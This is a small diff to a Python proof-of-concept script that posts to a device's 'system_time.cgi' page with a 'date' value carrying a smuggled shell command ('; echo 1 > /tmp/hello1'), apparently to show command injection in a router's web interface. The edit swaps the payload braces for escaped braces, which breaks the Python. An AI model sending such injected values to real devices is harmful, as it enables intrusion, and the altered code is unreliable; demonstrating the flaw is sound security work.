@@ -22,11 +22,11 @@ url = ip + 'system_time.cgi'
 
 command = "20250523; echo 1 > /tmp/hello1"
 
-payload = {
+payload = \{
     "date": command,
     
     "html_response_return_page": "static_routing.asp",
-}
+\}
 
 r = requests.post(url, data=payload)
 
